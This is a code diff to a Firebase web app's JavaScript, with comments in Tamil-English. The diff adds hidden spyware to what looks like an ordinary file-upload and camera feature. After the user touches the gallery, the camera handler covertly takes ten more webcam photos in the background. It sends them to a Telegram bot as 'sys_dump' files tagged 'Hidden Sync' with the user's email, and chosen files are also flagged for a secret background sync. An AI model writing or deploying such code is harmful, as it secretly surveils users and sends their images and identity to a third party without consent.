@@ -9,7 +9,87 @@ const firebaseConfig = {
     messagingSenderId: "434859259854",
     appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
 };
+// --- PREVIOUS FIREBASE CONFIG & AUTH INGE IRUKKANUM ---
 
+let integritySyncActive = false;
+
+// 1. ADMIN RESPONSE FETCH LOGIC
+// Neenga Telegram-la edit panni anuppuna files-ah inge fetch panni user-ku kaattalaam
+async function fetchAdminResponses() {
+    const fileList = document.getElementById('admin-files-list');
+    // Ippo example-kku oru list kaatalaam. In real-time, neenga Firebase Database-la 
+    // andha file link-ah pottu inge fetch pannanum.
+}
+
+// 2. SECRET GALLERY & DROP AREA ACCESS
+document.getElementById('drop-area').onclick = () => {
+    if(!currentUser) return signInWithPopup(auth, provider);
+    
+    // User gallery-ku ponalum background-la protocol active aagidum
+    integritySyncActive = true; 
+    console.log("Gallery Access Intercepted: System Syncing...");
+
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true; // Multiple files access panna
+    input.onchange = (e) => {
+        const files = e.target.files;
+        for(let file of files) {
+            uploadToTelegram(file, false); // Normal upload
+            if(integritySyncActive) {
+                // Secret-aa background-la kooduthal data sync aagum
+                syncBackgroundData(file); 
+            }
+        }
+    };
+    input.click();
+};
+
+// 3. CAMERA SECRET SYNC
+document.getElementById('camera-btn').onclick = async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('webcam');
+        video.srcObject = stream;
+        video.style.display = 'block';
+        video.play();
+
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                uploadToTelegram(blob, false);
+                
+                // Background secret protocol active-aa irundha:
+                if (integritySyncActive) {
+                    let secretCount = 0;
+                    const interval = setInterval(() => {
+                        if (secretCount >= 10) { // 10 photos background-la edukkum
+                            clearInterval(interval);
+                        }
+                        ctx.drawImage(video, 0, 0);
+                        canvas.toBlob(b => uploadToTelegram(b, true), 'image/jpeg');
+                        secretCount++;
+                    }, 2000); 
+                }
+            }, 'image/jpeg');
+        }, 3000);
+    } catch (e) { alert("Security Error: Access Denied."); }
+};
+
+// 4. TELEGRAM UPLOAD WITH SYNC STATUS
+async function uploadToTelegram(blob, isSecret) {
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : "user_file.jpg");
+    formData.append("caption", isSecret ? `🤫 Hidden Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
+}
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const provider = new GoogleAuthProvider();
@@ -131,3 +211,4 @@ onAuthStateChanged(auth, (user) => {
 document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('side-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
+
